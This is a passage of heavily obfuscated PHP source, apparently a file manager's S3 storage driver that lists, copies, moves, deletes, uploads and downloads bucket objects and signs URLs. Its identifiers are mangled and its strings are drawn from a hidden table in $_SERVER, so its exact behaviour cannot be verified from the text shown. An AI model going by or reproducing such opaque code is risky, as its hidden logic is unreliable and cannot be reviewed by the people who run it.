IO::move($é¿É’öœ, $÷ÊÄçƒ—); } Cache::set($ßÊà×Œ§, $¨â©øä³[186], 600); del_file($é¿É’öœ); return $¨â©øä³[195] . $¥åÙ™Å” . $¨â©øä³[73]; } public function fileOutImageServer($Æ‰§µ˜é, $§çÚ´¦Ş = 250) { $this->fileOutImage($Æ‰§µ˜é, $§çÚ´¦Ş); } public function fileNameAuto($ÀšÒ—±, $Ç›º¸ø, $ó¢¢œ±„ = REPEAT_RENAME, $¦‚şãÚŞ = false) { $¿˜ùåûè =& $_SERVER[ò«¥Ê‡å]; $ı¼¹ÃÜ” = $ÀšÒ—± === $¿˜ùåûè[12] ? $Ç›º¸ø : rtrim($ÀšÒ—±, $¿˜ùåûè[8]) . $¿˜ùåûè[8] . $Ç›º¸ø; if ($ó¢¢œ±„ == REPEAT_REPLACE || !$this->exist($ı¼¹ÃÜ”) || $¦‚şãÚŞ && $ó¢¢œ±„ != REPEAT_RENAME_FOLDER) { return $Ç›º¸ø; } if ($ó¢¢œ±„ == REPEAT_SKIP) { return !1; } $›•–ß—Ã = $¿˜ùåûè[10] . get_path_ext($Ç›º¸ø); $›•–ß—Ã = $›•–ß—Ã == $¿˜ùåûè[10] || $¦‚şãÚŞ ? $¿˜ùåûè[12] : $›•–ß—Ã; $è–ºèÕë = 1; $Ó•äô® = substr($Ç›º¸ø, 0, strlen($Ç›º¸ø) - strlen($›•–ß—Ã)); $ñ¥ßÜÅ = $Ó•äô® . "\50{$è–ºèÕë}\x29{$›•–ß—Ã}"; while ($this->exist(rtrim($ÀšÒ—±, $¿˜ùåûè[8]) . $¿˜ùåûè[8] . $ñ¥ßÜÅ)) { $ñ¥ßÜÅ = $Ó•äô® . "\x28{$è–ºèÕë}\x29{$›•–ß—Ã}"; $è–ºèÕë++; } return $ñ¥ßÜÅ; } private function fileNameAutoList($•™™—üÅ, $¼êìËˆÇ, $»ñ±çñ¼ = false) { $õ“õ‹î =& $_SERVER[ò«¥Ê‡å]; $‘áìéñÂ = $this->listPath($•™™—üÅ, !0); $‘áìéñÂ = array_merge($‘áìéñÂ[$õ“õ‹î[84]], $‘áìéñÂ[$õ“õ‹î[85]]); $¥üû‘„Ú = array_to_keyvalue($‘áìéñÂ, $õ“õ‹î[12], $õ“õ‹î[32]); $ÒæŠĞØ¹ = $õ“õ‹î[10] . get_path_ext($¼êìËˆÇ); $ÒæŠĞØ¹ = $ÒæŠĞØ¹ == $õ“õ‹î[10] || $»ñ±çñ¼ ? $õ“õ‹î[12] : $ÒæŠĞØ¹; $¬ÆşĞ’ = substr($¼êìËˆÇ, 0, strlen($¼êìËˆÇ) - strlen($ÒæŠĞØ¹)); $ò½ĞåÌŒ = $¬ÆşĞ’ . "\x28\60\x29{$ÒæŠĞØ¹}"; for ($¨ı÷ = 1; $¨ı÷ <= count($¥üû‘„Ú) + 1; $¨ı÷++) { $ò½ĞåÌŒ = $¬ÆşĞ’ . "\50{$¨ı÷}\51{$ÒæŠĞØ¹}"; if (!in_array_not_case($ò½ĞåÌŒ, $¥üû‘„Ú)) { return $ò½ĞåÌŒ; } } return $ò½ĞåÌŒ; } public function listAllFiles($­±”ˆ², $¸˜ºõòÜ) { $éÜÌ‹© =& $_SERVER[ò«¥Ê‡å]; if (empty($¸˜ºõòÜ)) { return array(); } $Ù¹ÌÅïÒ = array_keys($¸˜ºõòÜ); $ ƒ¬— = array(); $­±”ˆ² = trim($­±”ˆ², $éÜÌ‹©[8]); foreach ($¸˜ºõòÜ as $„‰÷Üæ => $è½áÄ’á) { $Ëã·Ò° = ltrim(substr(trim($„‰÷Üæ, $éÜÌ‹©[8]), strlen($­±”ˆ²)), $éÜÌ‹©[8]); if (substr($„‰÷Üæ, -1) == $éÜÌ‹©[8]) { $Ëã·Ò° = rtrim($Ëã·Ò°, $éÜÌ‹©[8]) . $éÜÌ‹©[8]; } $ ƒ¬— = array_merge($ ƒ¬—, $this->slicePath($Ëã·Ò°)); } $œÃ£Ÿ¢¥ = array(); foreach (array_unique($ ƒ¬—) as $À¥øêÍ) { $û¸Ê»¿ü = array($éÜÌ‹©[86] => $this->getPathOuter($éÜÌ‹©[8] . $­±”ˆ² . $éÜÌ‹©[8] . $À¥øêÍ), $éÜÌ‹©[77] => 1, $éÜÌ‹©[78] => 0); if (substr($À¥øêÍ, -1) != $éÜÌ‹©[8]) { $û¸Ê»¿ü[$éÜÌ‹©[77]] = 0; $ºÔ¾î“æ = $this->getPath($­±”ˆ² . $éÜÌ‹©[8] . $À¥øêÍ); if (isset($¸˜ºõòÜ[$ºÔ¾î“æ])) { $Ìœ¿¼³Ë = $¸˜ºõòÜ[$ºÔ¾î“æ]; if (isset($Ìœ¿¼³Ë[$éÜÌ‹©[78]])) { $û¸Ê»¿ü[$éÜÌ‹©[78]] = intval($Ìœ¿¼³Ë[$éÜÌ‹©[78]]); } if (isset($Ìœ¿¼³Ë[$éÜÌ‹©[196]])) { $û¸Ê»¿ü[$éÜÌ‹©[87]] = intval($Ìœ¿¼³Ë[$éÜÌ‹©[196]]); } } } $œÃ£Ÿ¢¥[] = $û¸Ê»¿ü; } return $œÃ£Ÿ¢¥; } public function slicePath($ÒÌŞÖÏ”) { $ºµ‰É˜“ =& $_SERVER[ò«¥Ê‡å]; $Ô¿à„Î£ = explode($ºµ‰É˜“[8], trim($ÒÌŞÖÏ”, $ºµ‰É˜“[8])); $ØŒñ¬ĞÅ = 0; do { ++$ØŒñ¬ĞÅ; $Ò©½Å[] = implode($ºµ‰É˜“[8], array_slice($Ô¿à„Î£, 0, $ØŒñ¬ĞÅ)) . $ºµ‰É˜“[8]; } while ($ØŒñ¬ĞÅ < count($Ô¿à„Î£)); $Ò©½Å[count($Ô¿à„Î£) - 1] = $ÒÌŞÖÏ”; return $Ò©½Å; } public function getHost() { $¿––ê‘± =& $_SERVER[ò«¥Ê‡å]; $ô–‰ü = parse_url(trim($this->domain, $¿––ê‘±[8])); $¬¨ı­ÀÏ = isset($ô–‰ü[$¿––ê‘±[197]]) ? $ô–‰ü[$¿––ê‘±[197]] : http_type(); $ş’ìÑÙ‘ = isset($ô–‰ü[$¿––ê‘±[198]]) ? $ô–‰ü[$¿––ê‘±[198]] : $ô–‰ü[$¿––ê‘±[86]]; if (isset($ô–‰ü[$¿––ê‘±[199]])) { $ş’ìÑÙ‘ .= $¿––ê‘±[4] . $ô–‰ü[$¿––ê‘±[199]]; } return $¬¨ı­ÀÏ . $¿––ê‘±[200] . $ş’ìÑÙ‘; } public function pathEncode($ÌÚœ°¿•) { $™öÍïú =& $_SERVER[ò«¥Ê‡å]; return str_replace($™öÍïú[201], $™öÍïú[8], rawurlencode($ÌÚœ°¿•)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($¿ó¸®ßñ) { set_timeout(); require_once SDK_DIR . $_SERVER[ò«¥Ê‡å][202]; parent::__construct(); $this->_init($¿ó¸®ßñ); } public function _init($‚˜Ò§À›) { $this->config = $‚˜Ò§À›; foreach ($‚˜Ò§À› as $¹•ò§Éè => $„¶Ï Ä) { if (isset($this->{$¹•ò§Éè})) { $this->{$¹•ò§Éè} = $„¶Ï Ä; } } $this->endpoint = $‚˜Ò§À›[$_SERVER[ò«¥Ê‡å][203]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($öç•§Ÿ = "\x76\64") { $this->signVer = $öç•§Ÿ; $this->client->setSignatureVersion($öç•§Ÿ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $ôÅŞ·» =& $_SERVER[ò«¥Ê‡å]; $Ê¥ˆÏ¾¼ = $this->getBucketCors(); if (!$Ê¥ˆÏ¾¼ || !is_array($Ê¥ˆÏ¾¼)) { return !1; } if ($Ê¥ˆÏ¾¼[$ôÅŞ·»[204]] != $ôÅŞ·»[205] || $Ê¥ˆÏ¾¼[$ôÅŞ·»[206]] != $ôÅŞ·»[205]) { return !1; } $±å¾Ú¬Ü = array_map($ôÅŞ·»[207], $Ê¥ˆÏ¾¼[$ôÅŞ·»[208]]); if (!is_array($±å¾Ú¬Ü)) { $±å¾Ú¬Ü = array(); } $âÎÓŸŒ¨ = array($ôÅŞ·»[209], $ôÅŞ·»[210], $ôÅŞ·»[211], $ôÅŞ·»[212], $ôÅŞ·»[213]); $İ°œ††Ê = array_diff($âÎÓŸŒ¨, $±å¾Ú¬Ü); return empty($İ°œ††Ê); } public function mkfile($ú¾ğƒƒÄ, $Ÿ„»Ÿ = '', $»ÇÏíÄ‹ = REPEAT_RENAME) { $…­ùÁñ = $this->setContent($ú¾ğƒƒÄ, $Ÿ„»Ÿ); if ($…­ùÁñ !== !1) { return $this->getPathOuter($ú¾ğƒƒÄ); } return !1; } public function mkdir($Ä‡»†ôÙ, $ë›½¦­ê = REPEAT_SKIP) { $‹õ‘ë =& $_SERVER[ò«¥Ê‡å]; if (empty($Ä‡»†ôÙ) && $Ä‡»†ôÙ !== $‹õ‘ë[214]) { return !1; } if ($ë›½¦­ê && $this->_isFolder($Ä‡»†ôÙ)) { return $this->getPathOuter($Ä‡»†ôÙ); } $¢µÃÌ ¼ = $this->setContent($Ä‡»†ôÙ, $‹õ‘ë[12], !0); if ($¢µÃÌ ¼ !== !1) { return $this->getPathOuter($Ä‡»†ôÙ); } return !1; } public function copyFile($·Ü’¥æû, $Ëçˆ¢Ñé, $…¢“íÈ = array()) { $‹‹óºöÈ =& $_SERVER[ò«¥Ê‡å]; $ß§—ÄÔÁ = $this->objectMeta($·Ü’¥æû); if (!$ß§—ÄÔÁ) { return !1; } if ($ß§—ÄÔÁ[$‹‹óºöÈ[78]] <= 1024 * 1024 * 200) { $¾’Ş·¹• = $this->client->copyObject($this->bucket, $·Ü’¥æû, $this->bucket, $Ëçˆ¢Ñé, $‹‹óºöÈ[215], $…¢“íÈ); } else { $¾’Ş·¹• = $this->client->multiCopyObject($this->bucket, $·Ü’¥æû, $this->bucket, $Ëçˆ¢Ñé, $…¢“íÈ); } $¾’Ş·¹• = $¾’Ş·¹• ? $this->getPathOuter($Ëçˆ¢Ñé) : !1; return $¾’Ş·¹•; } public function moveFile($Ó¦ÕÌİÀ, $ŠÎåá×â) { if ($this->copyFile($Ó¦ÕÌİÀ, $ŠÎåá×â)) { $this->delFile($Ó¦ÕÌİÀ); return $this->getPathOuter($ŠÎåá×â); } return !1; } public function delFile($ƒí®íÊÙ) { return $this->client->deleteObject($this->bucket, $ƒí®íÊÙ); } public function delFolder($¾Ûş¿õ´) { $Í®’¬åú =& $_SERVER[ò«¥Ê‡å]; if (!$this->exist($¾Ûş¿õ´)) { return !0; } $this->listItemCache = !1; $Âó—¼Ó = $this->fileList($¾Ûş¿õ´); $this->listItemCache = !0; $Ÿ±…Õ‘¥ = trim($¾Ûş¿õ´, $Í®’¬åú[8]) . $Í®’¬åú[8]; if (!empty($¾Ûş¿õ´) && $¾Ûş¿õ´ !== $Í®’¬åú[214] && !in_array($Ÿ±…Õ‘¥, $Âó—¼Ó[$Í®’¬åú[84]])) { $Âó—¼Ó[$Í®’¬åú[84]][] = $Ÿ±…Õ‘¥; } $¡ì¤í÷ß = $this->delByBatch($Âó—¼Ó[$Í®’¬åú[85]]); if (!$¡ì¤í÷ß) { return !1; } $¡ì¤í÷ß = $this->delByBatch($Âó—¼Ó[$Í®’¬åú[84]]); if (!$¡ì¤í÷ß) { return !1; } return $this->delFile($Ÿ±…Õ‘¥); } private function delByBatch($Ç±ê¢Îö) { foreach (array_chunk($Ç±ê¢Îö, 1000) as $ö¯Ü¶Ï) { $ƒ‚ÊÅ‚­ = $this->client->deleteObjects($this->bucket, $ö¯Ü¶Ï); if (!$ƒ‚ÊÅ‚­) { return !1; } } return !0; } public function rename($ÕÆîÔ¨Ê, $Ê¸Õµ‘ê) { return $this->renameObject($ÕÆîÔ¨Ê, $Ê¸Õµ‘ê); } public function listPath($˜¤øêÑ“, $ÉîÖ·²Í = false) { $³Øğí¨ =& $_SERVER[ò«¥Ê‡å]; $öë™ª‘ì = $this->fileList($˜¤øêÑ“, $³Øğí¨[8], !0); foreach ($öë™ª‘ì[$³Øğí¨[84]] as $ÎÕØ¹Š“ => $éÛ’–üÍ) { $öë™ª‘ì[$³Øğí¨[84]][$ÎÕØ¹Š“] = $this->folderInfo($éÛ’–üÍ, $ÉîÖ·²Í, $éÛ’–üÍ); } foreach ($öë™ª‘ì[$³Øğí¨[85]] as $ÎÕØ¹Š“ => $éÛ’–üÍ) { $öë™ª‘ì[$³Øğí¨[85]][$ÎÕØ¹Š“] = $this->fileInfo($éÛ’–üÍ[$³Øğí¨[32]], $ÉîÖ·²Í, $éÛ’–üÍ); } return $öë™ª‘ì; } protected function infoChildren($úŒÔğÚ”, &$·úÌ‡ßÕ) { $úŒóÀô³ =& $_SERVER[ò«¥Ê‡å]; $ö´š›ï… = $this->fileList($úŒÔğÚ”, $úŒóÀô³[12], !0); $·úÌ‡ßÕ[$úŒóÀô³[80]] += count($ö´š›ï…[$úŒóÀô³[84]]); $·úÌ‡ßÕ[$úŒóÀô³[79]] += count($ö´š›ï…[$úŒóÀô³[85]]); foreach ($ö´š›ï…[$úŒóÀô³[85]] as $ò²¤¦ÆÒ) { if (!$ò²¤¦ÆÒ || !$ò²¤¦ÆÒ[$úŒóÀô³[78]]) { continue; } $·úÌ‡ßÕ[$úŒóÀô³[78]] += $ò²¤¦ÆÒ[$úŒóÀô³[78]]; } } private function fileInfo($‹‚…ˆÙŞ, $õìŒÃ±» = false, $îšâß«ş = array()) { $Ñõüëæ× =& $_SERVER[ò«¥Ê‡å]; $ƒ—ûúâ  = array($Ñõüëæ×[32] => $this->pathThis($‹‚…ˆÙŞ), $Ñõüëæ×[86] => $this->getPathOuter($‹‚…ˆÙŞ), $Ñõüëæ×[33] => $Ñõüëæ×[216], $Ñõüëæ×[177] => $this->ext($‹‚…ˆÙŞ), $Ñõüëæ×[78] => isset($îšâß«ş[$Ñõüëæ×[78]]) ? $îšâß«ş[$Ñõüëæ×[78]] : 0); if ($õìŒÃ±») { return $ƒ—ûúâ ; } $ƒ—ûúâ [$Ñõüëæ×[217]] = $ƒ—ûúâ [$Ñõüëæ×[87]] = 0; $ƒ—ûúâ [$Ñõüëæ×[218]] = $ƒ—ûúâ [$Ñõüëæ×[219]] = !0; if (empty($îšâß«ş)) { $îšâß«ş = $this->objectMeta($‹‚…ˆÙŞ); if (!$îšâß«ş) { return $ƒ—ûúâ ; } } if (isset($îšâß«ş[$Ñõüëæ×[220]]) && $îšâß«ş[$Ñõüëæ×[220]]) { $ƒ—ûúâ [$Ñõüëæ×[221]] = $îšâß«ş[$Ñõüëæ×[220]]; } if (isset($îšâß«ş[$Ñõüëæ×[196]])) { $ƒ—ûúâ [$Ñõüëæ×[87]] = $îšâß«ş[$Ñõüëæ×[196]]; } if (isset($îšâß«ş[$Ñõüëæ×[78]])) { $ƒ—ûúâ [$Ñõüëæ×[78]] = $îšâß«ş[$Ñõüëæ×[78]]; } return $ƒ—ûúâ ; } private function folderInfo($ŒÜ’ÚÜ, $å½ã©ßÀ = false, $Õ—œ â = array()) { $ş’Îâ¼¯ =& $_SERVER[ò«¥Ê‡å]; $ÃêäÍ = array($ş’Îâ¼¯[32] => $this->pathThis($ŒÜ’ÚÜ), $ş’Îâ¼¯[86] => $this->getPathOuter($ş’Îâ¼¯[8] . $ŒÜ’ÚÜ), $ş’Îâ¼¯[33] => $ş’Îâ¼¯[77]); if ($å½ã©ßÀ) { return $ÃêäÍ; } $ÃêäÍ[$ş’Îâ¼¯[217]] = $ÃêäÍ[$ş’Îâ¼¯[87]] = 0; $ÃêäÍ[$ş’Îâ¼¯[218]] = $ÃêäÍ[$ş’Îâ¼¯[219]] = !0; if ($ŒÜ’ÚÜ == $ş’Îâ¼¯[12]) { return $ÃêäÍ; } if (empty($Õ—œ â)) { $Õ—œ â = $this->objectMeta(trim($ŒÜ’ÚÜ, $ş’Îâ¼¯[8]) . $ş’Îâ¼¯[8]); } if (isset($Õ—œ â[$ş’Îâ¼¯[196]])) { $ÃêäÍ[$ş’Îâ¼¯[217]] = $Õ—œ â[$ş’Îâ¼¯[196]]; } return $ÃêäÍ; } private function fileList($ÎÆ¶åß, $‡ÓÕ³¸ï = '', $†÷…ù· = 0) { $âÄôğ€Ñ =& $_SERVER[ò«¥Ê‡å]; $ÉáÓ’­ = rtrim($ÎÆ¶åß, $âÄôğ€Ñ[8]) . $âÄôğ€Ñ[8]; $è—¦âÙ = $this->listObjs($ÉáÓ’­, null, null, $‡ÓÕ³¸ï); if (!$è—¦âÙ) { return array($âÄôğ€Ñ[84] => array(), $âÄôğ€Ñ[85] => array()); } $‚¦íûíò = $Ÿ„‹ ß¶ = array(); foreach ($è—¦âÙ[$âÄôğ€Ñ[222]] as $³­ƒø¸) { $àà¢Ô½Í = $³­ƒø¸[$âÄôğ€Ñ[32]]; if ($àà¢Ô½Í == $ÉáÓ’­) { continue; } $íÖÛÜ²  = isset($³­ƒø¸[$âÄôğ€Ñ[78]]) ? $³­ƒø¸[$âÄôğ€Ñ[78]] : 0; $Ü¦ÛÍªÜ = $íÖÛÜ²  == 0 && substr($àà¢Ô½Í, strlen($àà¢Ô½Í) - 1, 1) == $âÄôğ€Ñ[8] ? !0 : !1; $this->cacheMethodInfoSet($àà¢Ô½Í, $Ü¦ÛÍªÜ, $³­ƒø¸); if ($Ü¦ÛÍªÜ) { $‚¦íûíò[] = $àà¢Ô½Í; continue; } $Ÿ„‹ ß¶[] = $†÷…ù· ? $³­ƒø¸ : $àà¢Ô½Í; } foreach ($è—¦âÙ[$âÄôğ€Ñ[223]] as $³­ƒø¸) { $‚¦íûíò[] = $³­ƒø¸[$âÄôğ€Ñ[32]]; $this->cacheMethodInfoSet($³­ƒø¸[$âÄôğ€Ñ[32]], !0); } $this->cacheMethodInfoSet($ÎÆ¶åß, !0); return array($âÄôğ€Ñ[84] => $‚¦íûíò, $âÄôğ€Ñ[85] => $Ÿ„‹ ß¶); } private function listObjs($úãÁ‘²Û, $ç’‡Ş¯ˆ = null, $³“ñìøù = null, $ü…‚£ëó = null) { $ÕËªÅ®½ =& $_SERVER[ò«¥Ê‡å]; $úãÁ‘²Û = trim($úãÁ‘²Û, $ÕËªÅ®½[8]); $ß·»äá = empty($úãÁ‘²Û) && $úãÁ‘²Û !== $ÕËªÅ®½[214] ? $ÕËªÅ®½[12] : $úãÁ‘²Û . $ÕËªÅ®½[8]; return $this->client->getBucket($this->bucket, $ß·»äá, $ç’‡Ş¯ˆ, $³“ñìøù, $ü…‚£ëó, !0); } public function has($å¡»–ş©, $Ø¼·Ş•» = false, $ñåşâ ¬ = true) { $Ê¼°“å¶ =& $_SERVER[ò«¥Ê‡å]; $å¡»–ş© = trim($å¡»–ş©, $Ê¼°“å¶[8]); $†¶é³çå = empty($å¡»–ş©) && $å¡»–ş© !== $Ê¼°“å¶[214] ? $Ê¼°“å¶[12] : $å¡»–ş© . $Ê¼°“å¶[8]; $¦’»œšä = null; $ù¶±”İÈ = 500; $ä‘¬µÌİ = $Ê¼°“å¶[8]; $´ü¿“„Ğ = $Ü©®ßØÁ = array(); while (!0) { $ÜÒ‚œ¨ = $this->listObjs($å¡»–ş©, $¦’»œšä, $ù¶±”İÈ, $ä‘¬µÌİ); if (!$ÜÒ‚œ¨) { break; } $¦’»œšä = $ÜÒ‚œ¨[$Ê¼°“å¶[224]]; $ÖØ‚³âÁ = $ÜÒ‚œ¨[$Ê¼°“å¶[222]]; $¢éÉİíÇ = $ÜÒ‚œ¨[$Ê¼°“å¶[223]]; if (empty($ÖØ‚³âÁ) && empty($¢éÉİíÇ)) { break; } if (count($ÖØ‚³âÁ) == 1 && $ÖØ‚³âÁ[0][$Ê¼°“å¶[32]] == $†¶é³çå) { break; } if ($Ø¼·Ş•») { if (count($ÖØ‚³âÁ)) { $ÖØ‚³âÁ = array_column($ÖØ‚³âÁ, $Ê¼°“å¶[32]); $´ü¿“„Ğ = array_merge($´ü¿“„Ğ, $ÖØ‚³âÁ); } if (count($¢éÉİíÇ)) { $¢éÉİíÇ = array_column($¢éÉİíÇ, $Ê¼°“å¶[32]); $Ü©®ßØÁ = array_merge($Ü©®ßØÁ, $¢éÉİíÇ); } if ($¦’»œšä === null) { break; } continue; } if ($ñåşâ ¬) { if (!empty($ÖØ‚³âÁ)) { if (count($ÖØ‚³âÁ) > 1 || isset($ÖØ‚³âÁ[0][$Ê¼°“å¶[32]]) && $ÖØ‚³âÁ[0][$Ê¼°“å¶[32]] != $†¶é³çå) { return !0; } } } else { if (!empty($¢éÉİíÇ)) { return !0; } } if ($¦’»œšä === null) { break; } } if ($Ø¼·Ş•») { $´ü¿“„Ğ = array_diff($´ü¿“„Ğ, array($†¶é³çå)); $´ü¿“„Ğ = count(array_unique($´ü¿“„Ğ)); $Ü©®ßØÁ = count(array_unique($Ü©®ßØÁ)); return array($Ê¼°“å¶[225] => $´ü¿“„Ğ, $Ê¼°“å¶[226] => $Ü©®ßØÁ); } return !1; } public function listAll($‚ç–à§) { $éŒşĞ¬Ò =& $_SERVER[ò«¥Ê‡å]; $Õ¥çÌ“ = $this->fileList($‚ç–à§, $éŒşĞ¬Ò[12], !0); $°·†Œô = array_to_keyvalue($Õ¥çÌ“[$éŒşĞ¬Ò[85]], $éŒşĞ¬Ò[32]); foreach ($Õ¥çÌ“[$éŒşĞ¬Ò[84]] as $óó¢Ğú) { if (is_string($óó¢Ğú)) { $°·†Œô[$óó¢Ğú] = array($éŒşĞ¬Ò[78] => 0); } } return $this->listAllFiles($‚ç–à§, $°·†Œô); } public function canRead($ìš‰é³Ü) { $şÕâÑ£ =& $_SERVER[ò«¥Ê‡å]; $°†Üöã¬ = $this->client->getAccessControlPolicy($this->bucket, $ìš‰é³Ü); if (!$°†Üöã¬) { return !1; } return in_array($°†Üöã¬, array($şÕâÑ£[227], $şÕâÑ£[228], $şÕâÑ£[229])) ? !0 : !1; } public function canWrite($ª§„ÇÓÙ) { $ÒÇÓğ =& $_SERVER[ò«¥Ê‡å]; $Ÿò„·Ù = $this->client->getAccessControlPolicy($this->bucket, $ª§„ÇÓÙ); if (!$Ÿò„·Ù) { return !1; } return in_array($Ÿò„·Ù, array($ÒÇÓğ[227], $ÒÇÓğ[228])) ? !0 : !1; } public function getContent($ÄÜµ¬¨ˆ) { return $this->client->getObject($this->bucket, $ÄÜµ¬¨ˆ); } public function setContent($€²ˆõ«µ, $°ü§¯ù» = '', $‘ÉÏÕ·ö = false) { $óÎ¡ÌïÆ =& $_SERVER[ò«¥Ê‡å]; $€²ˆõ«µ = $‘ÉÏÕ·ö ? trim($€²ˆõ«µ, $óÎ¡ÌïÆ[8]) . $óÎ¡ÌïÆ[8] : $€²ˆõ«µ; $É¼ª²¼Ó = get_file_mime(get_path_ext($€²ˆõ«µ)); $àİŠ•§ª = $this->client->putObject($°ü§¯ù», $this->bucket, $€²ˆõ«µ, $óÎ¡ÌïÆ[215], array(), $É¼ª²¼Ó); if (!$àİŠ•§ª) { return !1; } if ($‘ÉÏÕ·ö) { return !0; } $this->cacheMethod(null, null); $àİŠ•§ª = $this->copyFile($€²ˆõ«µ, $€²ˆõ«µ, array($óÎ¡ÌïÆ[230] => $àİŠ•§ª[$óÎ¡ÌïÆ[220]])); return $àİŠ•§ª ? !0 : !1; } public function fileSubstr($º•§·Õâ, $›èÃÛ¡Ğ, $¤ËŞ„ï) { $åšÏÉñ‚ = $›èÃÛ¡Ğ + $¤ËŞ„ï - 1; return $this->client->getObject($this->bucket, $º•§·Õâ, array($_SERVER[ò«¥Ê‡å][231] => "\142\x79\x74\145\x73\75{$›èÃÛ¡Ğ}\x2d{$åšÏÉñ‚}")); } public function upload($İ—£üü, $ß™ ’Š¾, $€…ìê½Ô = false, $á«ÙÑÌÅ = REPEAT_REPLACE) { $„‰—¤üú =& $_SERVER[ò«¥Ê‡å]; $ıığñ¦Ğ = array($„‰—¤üú[230] => @md5_file($ß™ ’Š¾)); $¸¹İÓõ = array($„‰—¤üú[232] => get_file_mime(get_path_ext($İ—£üü))); if (IO::size($ß™ ’Š¾) <= 1024 * 1024 * 200) { $€µñ®©– = $this->client->putObjectFile($ß™ ’Š¾, $this->bucket, $İ—£üü, $„‰—¤üú[215], $ıığñ¦Ğ, $¸¹İÓõ); return !empty($€µñ®©–) ? $this->getPathOuter($İ—£üü) : !1; } $‰ÈÃîö = $this->client->multiUploadObject($ß™ ’Š¾, $this->bucket, trim($İ—£üü, $„‰—¤üú[8]), $ıığñ¦Ğ, $¸¹İÓõ); return $‰ÈÃîö ? $this->getPathOuter($İ—£üü) : !1; } public function download($Åß–¯’, $„Á‡íÁ…) { if (!@is_dir($this->pathFather($„Á‡íÁ…)) && !IO::mkdir($this->pathFather($„Á‡íÁ…))) { return !1; } $†ŸÌ‘¹ø = $this->client->getObject($this->bucket, $Åß–¯’, array(), $„Á‡íÁ…); return $†ŸÌ‘¹ø !== !1 ? $„Á‡íÁ… : !1; } public function link($Î³Ê¦îó, $ƒÇ–€ ± = array()) { $ç‚§©«Ë =& $_SERVER[ò«¥Ê‡å]; if ($this->signVer == $ç‚§©«Ë[233]) { return $this->client->getAuthenticatedURL($this->bucket, $Î³Ê¦îó, 3600 * 12, $ƒÇ–€ ±); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($Î³Ê¦îó, $ç‚§©«Ë[8]), 3600 * 12, $this->region, array(), !0, $ƒÇ–€ ±); } public function fileOut($ÒÎñêİÔ, $á£òëô° = false, $íŞÇ„¥· = false, $ê®—ò… = '') { $Ç¦şşˆ¤ =& $_SERVER[ò«¥Ê‡å]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÒÎñêİÔ, $á£òëô°, $íŞÇ„¥·, $ê®—ò…); } if (!$íŞÇ„¥·) { $íŞÇ„¥· = $this->pathThis($ÒÎñêİÔ); } $äˆÀºï = get_file_mime(get_path_ext($íŞÇ„¥·)); if ($äˆÀºï == $Ç¦şşˆ¤[234]) { return parent::fileOut($ÒÎñêİÔ, $á£òëô°, $íŞÇ„¥·, $ê®—ò…); } $…ıÏ¢¡† = array($Ç¦şşˆ¤[235] => $äˆÀºï); if ($á£òëô°) { $…ıÏ¢¡†[$Ç¦şşˆ¤[236]] = $Ç¦şşˆ¤[237] . rawurlencode($íŞÇ„¥·); } else { } $»Œ«ºïı = $this->link($ÒÎñêİÔ, $…ıÏ¢¡†); $this->fileOutLink($»Œ«ºïı); } public function fileOutServer($ÖÂœ¢ÒÌ, $Óœš¢­Á = false, $çÆ¯•’§ = false, $áÂ¨ = '') { parent::fileOut($ÖÂœ¢ÒÌ, $Óœš¢­Á, $çÆ¯•’§, $áÂ¨); } public function fileOutImageServer($¨ëÚåÀ, $ÕëÈíí = 250) { parent::fileOutImage($¨ëÚåÀ, $ÕëÈíí); } public function hashMd5($ï€¢îÃÌ, $ãÀÜö“ = '') { $û½ºÁ‰£ =& $_SERVER[ò«¥Ê‡å]; $Êá„ÏŸ­ = $this->objectMeta($ï€¢îÃÌ); if (!$Êá„ÏŸ­) { return !1; } $ãÀÜö“ = $ãÀÜö“ ? $ãÀÜö“ : _get($Êá„ÏŸ­, $û½ºÁ‰£[238]); $ãÀÜö“ = $ãÀÜö“ ? $ãÀÜö“ : _get($Êá„ÏŸ­, $û½ºÁ‰£[220], $û½ºÁ‰£[12]); return $ãÀÜö“; } public function uploadFormData($”ã¹—û±, $’Äúˆ…ò = 3600) { $Ã½×°¬ù =& $_SERVER[ò«¥Ê‡å]; $ÕĞÉËŸˆ = $this->pathFather($”ã¹—û±); $¥ğãìˆ¤ = $this->client->getHttpUploadPostParams($this->bucket, $ÕĞÉËŸˆ, $Ã½×°¬ù[215], $’Äúˆ…ò); return array_merge((array) $¥ğãìˆ¤, array($Ã½×°¬ù[198] => $this->getHost())); } public function multiUploadFormData($Åñ¥¼³Ş, $›ÇÑÊ…½ = 3600) { $÷şØ¹îà =& $_SERVER[ò«¥Ê‡å]; $üä¤©Áš = gmdate($÷şØ¹îà[239]); $ÒË˜‰ = array(); $¹şŸÖÆ¿ = $this->client->getUploadId($this->bucket, $Åñ¥¼³Ş, $ÒË˜‰); if (!$¹şŸÖÆ¿) { return !1; } return array($÷şØ¹îà[240] => $¹şŸÖÆ¿, $÷şØ¹îà[198] => $this->getHost() . $÷şØ¹îà[8] . $this->pathEncode($Åñ¥¼³Ş), $÷şØ¹îà[241] => $üä¤©Áš, $÷şØ¹îà[96] => $Åñ¥¼³Ş); } public function multiUploadAuthData($Í’Ğ§Óå, $È¦µöÔ = array()) { $ÂÃÊ¥°– =& $_SERVER[ò«¥Ê‡å]; $é‹”£Éı = isset($È¦µöÔ[$ÂÃÊ¥°–[241]]) ? $È¦µöÔ[$ÂÃÊ¥°–[241]] : gmdate($ÂÃÊ¥°–[239]); $İÎİ·šî = isset($È¦µöÔ[$ÂÃÊ¥°–[177]]) ? $È¦µöÔ[$ÂÃÊ¥°–[177]] : $ÂÃÊ¥°–[12]; $£óˆ°Èš = $È¦µöÔ[$ÂÃÊ¥°–[96]]; unset($È¦µöÔ[$ÂÃÊ¥°–[96]]); if (isset($È¦µöÔ[$ÂÃÊ¥°–[242]])) { $È¦µöÔ[$ÂÃÊ¥°–[241]] = $é‹”£Éı; return $this->listUploadParts($£óˆ°Èš, $È¦µöÔ); } $åßÒëË = 